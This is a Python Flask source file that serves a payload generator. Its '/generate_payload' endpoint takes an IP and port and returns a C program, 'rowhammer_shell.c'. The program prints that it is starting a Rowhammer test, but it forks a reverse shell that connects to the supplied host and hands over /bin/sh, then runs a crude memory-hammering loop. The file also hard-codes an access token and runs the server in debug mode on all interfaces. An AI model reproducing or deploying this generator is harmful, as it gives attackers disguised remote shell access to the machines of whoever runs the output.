
from flask import Flask, request, jsonify, send_file
import io
from datetime import datetime

app = Flask(__name__)

AUTH_TOKEN = "kader11000"  # كلمة مرور الواجهة

def check_auth(request):
    token = request.headers.get('Authorization')
    return token == AUTH_TOKEN

@app.route('/generate_payload', methods=['POST'])
def generate_payload():
    if not check_auth(request):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    ip = data['ip']
    port = data['port']

    payload_code = generate_c_payload(ip, port)

    buffer = io.BytesIO()
    buffer.write(payload_code.encode())
    buffer.seek(0)

    return send_file(buffer, as_attachment=True, download_name='rowhammer_shell.c', mimetype='text/x-c')

def generate_c_payload(ip, port):
    return f"""
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define ARRAY_SIZE (256*4096)
char *array;

void hammer(void *addr1, void *addr2) {{
    volatile uint64_t *a1 = (volatile uint64_t*) addr1;
    volatile uint64_t *a2 = (volatile uint64_t*) addr2;
    for (int i = 0; i < 1000000; i++) {{
        _mm_clflush((void*)a1);
        _mm_clflush((void*)a2);
        *a1;
        *a2;
    }}
}}

void reverse_shell(const char *ip, int port) {{
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return;

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {{
        close(sock);
        return;
    }}

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);
}}

int main() {{
    array = malloc(ARRAY_SIZE);
    memset(array, 0, ARRAY_SIZE);

    printf("Starting Rowhammer test...\n");

    if (fork() == 0) {{
        reverse_shell("{ip}", {port});
        exit(0);
    }}

    hammer(&array[0], &array[4096]);

    printf("Finished.\n");
    return 0;
}}
"""

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
